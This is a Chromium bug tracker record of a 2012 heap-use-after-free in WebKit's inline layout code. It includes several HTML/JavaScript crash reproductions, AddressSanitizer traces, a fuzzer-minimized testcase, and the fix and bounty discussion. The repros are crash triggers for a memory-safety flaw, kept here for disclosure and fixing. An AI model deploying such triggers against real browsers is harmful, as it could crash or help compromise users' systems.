# Heap-use-after-free in WebCore::InlineFlowBox::computeUnderAnnotationAdjustment

| Field | Value |
|-------|-------|
| **Issue ID** | [40053499](https://issues.chromium.org/issues/40053499) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-09 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

this bug is giving me huge deja vu. but I couldn't find it in my list of open issues :|

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 19.0.1036.0 (Developer Build 121128)  

OS Linux  

WebKit 535.20 (@107140)  

JavaScript V8 3.9.4

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 {
-webkit-column-width: 0;
}
#el1::after {
display: table-caption;
content: "A";
}
#el2 {
-webkit-column-span: all;
}
</style>
<script>
function crash(){
el0 = document.createElement('div')
el0.setAttribute('id', 'el0')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el1.appendChild(document.createTextNode('A'))
el0.style.display='-webkit-box'
setTimeout(function() {
el2.style.display='compact'
},0)
}
window.onload=crash
</script>
</head>
<body>
</body>
</html>

---


<html>
<head>
<style>
#el0 {
-webkit-column-width: 1px;
content: counter(c);
}
#el2 {
-webkit-column-span: all;
content: counter(c);
-webkit-animation-name: a;
-webkit-animation-duration: 0.1s;
}
</style>
<script>
function crash(){
var el0 = document.createElement('div')
el0.setAttribute('id', 'el0')
document.body.appendChild(el0)
el1 = document.createElement('ol')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el1.appendChild(document.createTextNode('A'))
var el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el1.appendChild(document.createTextNode('A'))
el1.style.display='-webkit-flexbox'
setInterval(function() {
document.body.style.zoom=Math.random()\\*2
},1)
}
window.onload=crash
</script>
</head>
<body>
</body>
</html>

---


<html>
<head>
<style>
#el0 {
-webkit-animation-iteration-count: 2;
height: 1px;
-webkit-column-count: 2;
}
#el1 {
height: 2px;
-webkit-text-emphasis-style: circle;
}
#el2 {
-webkit-column-span: all;
}
</style>
<script>
function crash(){
el0 = document.createElement('div')
el0.setAttribute('id', 'el0')
document.body.appendChild(el0)
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
el0.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el1.appendChild(document.createTextNode('A'))
el1.style.display='-webkit-box'
document.body.offsetTop
el2.style.display='table-header-group'
}
window.onload=crash
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer+asan  

Crash State:

==8239== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed220ea0 at pc 0x55555ab8bbff bp 0x7fffffff0f20 sp 0x7fffffff0f18  

READ of size 8 at 0x7fffed220ea0 thread T0  

#0 0x55555ab8bbff in WebCore::InlineFlowBox::computeUnderAnnotationAdjustment(int) const ???:0  

#1 0x55555ac3a2c9 in WebCore::RenderBlock::layoutInlineChildren(bool, int&, int&) ???:0

0x7fffed220ea0 is located 32 bytes inside of 80-byte region [0x7fffed220e80,0x7fffed220ed0)  

freed by thread T0 here:  

#0 0x55555da194c2 in free ??:0  

#1 0x55555ab8db4d in WebCore::InlineTextBox::destroy(WebCore::RenderArena\*) ???:0  

#2 0x55555ae35bfd in WebCore::RenderText::dirtyLineBoxes(bool) ???:0  

#3 0x55555ac39d94 in WebCore::RenderBlock::layoutInlineChildren(bool, int&, int&) ???:0

---

==5014== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffc7d60098 at pc 0x55555ab73223 bp 0x7fffffff9980 sp 0x7fffffff9978  

READ of size 8 at 0x7fffc7d60098 thread T0  

#0 0x55555ab73223 in WebCore::InlineBox::remove() ???:0  

#1 0x55555aba896d in WebCore::RenderBlock::willBeDestroyed() ???:0

0x7fffc7d60098 is located 24 bytes inside of 80-byte region [0x7fffc7d60080,0x7fffc7d600d0)  

freed by thread T0 here:  

#0 0x55555da194c2 in free ??:0  

#1 0x55555ab8db4d in WebCore::InlineTextBox::destroy(WebCore::RenderArena\*) ???:0  

#2 0x55555ae35bfd in WebCore::RenderText::dirtyLineBoxes(bool) ???:0

---

==30949== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed221ba0 at pc 0x55555ab8b78a bp 0x7fffffff07d0 sp 0x7fffffff07c8  

READ of size 8 at 0x7fffed221ba0 thread T0  

#0 0x55555ab8b78a in WebCore::InlineFlowBox::computeOverAnnotationAdjustment(int) const ???:0  

#1 0x55555ae89d43 in WebCore::RootInlineBox::selectionTop() const ???:0

0x7fffed221ba0 is located 32 bytes inside of 80-byte region [0x7fffed221b80,0x7fffed221bd0)  

freed by thread T0 here:  

#0 0x55555da194c2 in free ??:0  

#1 0x55555ab8db4d in WebCore::InlineTextBox::destroy(WebCore::RenderArena\*) ???:0  

#2 0x55555ae35bfd in WebCore::RenderText::dirtyLineBoxes(bool) ???:0  

#3 0x55555ac39d94 in WebCore::RenderBlock::layoutInlineChildren(bool, int&, int&) ???:0

## Attachments

- [3280-1.html](attachments/3280-1.html) (text/html; charset=us-ascii, 884 B)
- [3280-1.txt](attachments/3280-1.txt) (text/x-c; charset=us-ascii, 11.1 KB)
- [3280-3.html](attachments/3280-3.html) (text/html; charset=us-ascii, 957 B)
- [3280-2.txt](attachments/3280-2.txt) (text/x-c; charset=us-ascii, 9.1 KB)
- [stable-3280-2.txt](attachments/stable-3280-2.txt) (text/plain; charset=us-ascii, 9.5 KB)
- [stable-3280-1.txt](attachments/stable-3280-1.txt) (text/plain; charset=us-ascii, 11.2 KB)
- [3280-2.html](attachments/3280-2.html) (text/html; charset=us-ascii, 1020 B)
- [3280-3.txt](attachments/3280-3.txt) (text/x-c; charset=us-ascii, 14.0 KB)
- [stable-3280-3.txt](attachments/stable-3280-3.txt) (text/plain; charset=us-ascii, 12.7 KB)
- [3280-2.html](attachments/3280-2_53207895.html) (text/html; charset=us-ascii, 1.0 KB)
- [3280-4.html](attachments/3280-4.html) (text/html; charset=us-ascii, 1.0 KB)
- [3280-4.txt](attachments/3280-4.txt) (text/x-c; charset=us-ascii, 13.1 KB)

## Timeline

### ts...@chromium.org (2012-02-09)

18.0.1025/linux/debug, 17.0.963/linux/debug hit assert on 3280-2.html 

ASSERTION FAILED: !m_hasBadParent
third_party/WebKit/Source/WebCore/rendering/InlineBox.h(208) : WebCore::InlineFlowBox* WebCore::InlineBox::parent() const


### ts...@chromium.org (2012-02-09)

Upstreamed as https://bugs.webkit.org/show_bug.cgi?id=78273

### in...@chromium.org (2012-02-10)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=19708419

Fuzzer: Marty_html_twiddler

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f50678fa8a0
Crash State:
  - crash stack -
  WebCore::InlineFlowBox::computeUnderAnnotationAdjustment
  WebCore::RenderBlock::layoutInlineChildren
  - free stack -
  WebCore::RenderLineBoxList::deleteLineBoxes
  WebCore::RenderBlock::layoutInlineChildren
  

Minimized Testcase (1.95 Kb): https://cluster-fuzz.appspot.com/download/AMIfv950MqCLONXxAxnUgPZPFTfv4WSMTYZizsecHdzOjzjwyhEuQ7Uqq8UuP-hwU-mFg_Ab1WWWr-nvUXTapK68jFesnMXtt4YDEzKrbWXhOPBc2ICKPAnuFkblozknfYN8ONhaRw79uEB3mPSO-O8n1BlxMtCejQ

### in...@chromium.org (2012-02-11)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=19722196

Fuzzer: Marty_html_twiddler

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7fc4ab3412a0
Crash State:
  - crash stack -
  WebCore::InlineFlowBox::computeUnderAnnotationAdjustment
  WebCore::RenderBlock::layoutInlineChildren
  - free stack -
  WebCore::InlineTextBox::destroy
  WebCore::RenderText::dirtyLineBoxes
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=110080:110106

Minimized Testcase (1.54 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96Cbh6VT75bDmPyrmbkYA7Ocmetpq_Lmj9gvlDFSHL9R2VK4N46SUJ0eZjXL-lSwGlWCEN_Qcfn2rlErzx3hcDksVVr9afzOCFYnWt0AfXaC_3H0pqf76h9UmXCcaUl4TktdEBhAi6qtFgRGyOr0d7vbrOfzA
<style>
.c3 { display: -webkit-inline-flexbox; height: 100%; }
.c8[class^="c8"] { float: none; content: counter(section); -webkit-column-span: all; }
.c17[class$="c17"] { display: compact; -webkit-column-count: 3; }
.c19 + .c17 { display: table;</style>
<script>
var nodes = Array();
function boom() {
try { nodes[6] = document.createElement('br'); } catch(e) {}
try { nodes[9] = document.createElement('map'); } catch(e) {}
try { nodes[9].setAttribute('class', 'c3'); } catch(e) {}
try { document.documentElement.appendChild(nodes[9]); } catch(e) {}
try { nodes[15] = document.createElement('samp'); } catch(e) {}
try { nodes[15].setAttribute('class', 'c3'); } catch(e) {}
try { nodes[55] = document.createElement('header'); } catch(e) {}
try { document.documentElement.appendChild(nodes[55]); } catch(e) {}
try { nodes[58] = document.createElement('section'); } catch(e) {}
try { nodes[58].setAttribute('class', 'c8'); } catch(e) {}
try { nodes[9].appendChild(nodes[58]); } catch(e) {}
try { nodes[98] = document.createElement('section'); } catch(e) {}
try { nodes[98].setAttribute('class', 'c17'); } catch(e) {}
try { document.documentElement.appendChild(nodes[98]); } catch(e) {}
setTimeout('try { nodes[98].appendChild(nodes[15]); } catch(e) {}', 136);
setTimeout('try { nodes[15].appendChild(nodes[9]); } catch(e) {}', 74);
setTimeout("try { nodes[55].setAttribute('class', 'c2'); } catch(e) {}", 309);
try { nodes[9].appendChild(nodes[6]); } catch(e) {}
setTimeout("try { nodes[55].setAttribute('class', 'c8'); } catch(e) {}", 551);
}
window.onload = boom;
</script>

### in...@chromium.org (2012-02-11)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-12)

Miaubiz, some of the repros dont work and others have random attributes like setIInterval, math.random. can you please provide one minimized repro without any random attributes.

### mi...@gmail.com (2012-02-12)

do 3280-1.html and 3280-3.html not work? 3280-2.html has the setInterval thing to get the alternate stack trace. without the random stuff it crashes with same stack was 3280-1.html for me. :| I am starting to remember why I got deja vu from this bug.

### in...@chromium.org (2012-02-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-15)

yes Miaubiz, only 3280-2.html was reproducing, and that is not fully reduced becoz of the random attributes

### mi...@gmail.com (2012-02-15)

does this work?

replaced random with *=1.01

gives me the 24 inside 80 stack

### mi...@gmail.com (2012-02-15)

here is another

==28904== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed22a0a0 at pc 0x55555ac1392e bp 0x7fffffff0ad0 sp 0x7fffffff0ac8
READ of size 8 at 0x7fffed22a0a0 thread T0
    #0 0x55555ac1392e in WebCore::InlineFlowBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0
    #1 0x55555af15ce1 in WebCore::RootInlineBox::paint(WebCore::PaintInfo&, WebCore::IntPoint const&, int, int) ???:0
    #2 0x55555ae0174e in WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject*, WebCore::PaintInfo&, WebCore::IntPoint const&) 

0x7fffed22a0a0 is located 32 bytes inside of 80-byte region [0x7fffed22a080,0x7fffed22a0d0)
freed by thread T0 here:
    #0 0x55555dab5692 in free ??:0
    #1 0x55555ac1a7dd in WebCore::InlineTextBox::destroy(WebCore::RenderArena*) ???:0
    #2 0x55555aec5dcd in WebCore::RenderText::dirtyLineBoxes(bool) ???:0


--


<html>
  <head>
    <style>
      #el0 {
        -webkit-column-count: 2; 
      }
      #el1 {
        height: 1000px; 
      }
      #el2 {
        -webkit-column-span: all; 
      }
    </style>
    <script>
      function crash(){
        el0 = document.createElement('div') 
        el0.setAttribute('id', 'el0') 
        document.body.appendChild(el0)
        el1 = document.createElement('div') 
        el1.setAttribute('id', 'el1') 
        el0.appendChild(el1) 
        el2 = document.createElement('div') 
        el2.setAttribute('id', 'el2') 
        el1.appendChild(el2) 
        el1.appendChild(document.createTextNode('A')) 
        el0.style.display='run-in'
        el1.style.display='-webkit-box'
        document.designMode='on'
        document.execCommand('selectall')
        el2.style.display='table-header-group'
        setTimeout(function() {
          el1.style.display='list-item'
          el2.style.display='table-row-group'
        }, 100)
      }
      window.onload=crash
    </script>
  </head>
  <body>
  </body>
</html>




### in...@chromium.org (2012-02-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-16)

http://trac.webkit.org/changeset/107965

### sc...@gmail.com (2012-02-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-18)

hold on merging this until i analyze http://code.google.com/p/chromium/issues/detail?id=114858

### in...@chromium.org (2012-02-19)

I shouldnt be using RenderObject::createNode functions, they will create clones incorrectly since they depend on the display type. Rolled out patch in https://trac.webkit.org/changeset/108183. e.g.  summary tag renderblock can have a display type table-row-group (renderbox) causing bad cast.

### in...@chromium.org (2012-02-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-22)

i finally understand the root cause of this bug (alongwith cloning madness). Have tested the fix with all repros from this bug and two dupes and nothing reproduces after that. also tested repros from 114858 to make sure we dont regress.

### in...@chromium.org (2012-02-22)

http://trac.webkit.org/changeset/108543

### sc...@gmail.com (2012-03-01)

M17: http://trac.webkit.org/changeset/109419
M18: http://trac.webkit.org/changeset/109421

### sc...@gmail.com (2012-03-03)

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### mi...@gmail.com (2012-03-12)

btw, should this count as two bugs? 113497 and 114800. or was 114800 a dupe of 114858 :D it's all so confusing but I love money.

### in...@chromium.org (2012-03-13)

Miaubiz, 114800 is a dupe of this https://crbug.com/chromium/113497. 114858 was a regression from the fix of this bug, which we identified from our fuzzing, soon after the fix went in. 

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/113497?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/113846, crbug.com/chromium/114800]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053499)*
